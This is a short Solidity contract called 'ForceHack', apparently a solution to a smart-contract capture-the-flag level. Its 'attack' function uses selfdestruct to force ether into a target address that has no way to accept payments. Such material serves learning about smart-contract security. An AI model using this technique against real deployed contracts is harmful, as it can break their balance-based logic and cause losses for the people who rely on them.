// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract ForceHack {
    function attack(address force) public payable {
        selfdestruct(payable(force));
    }
}
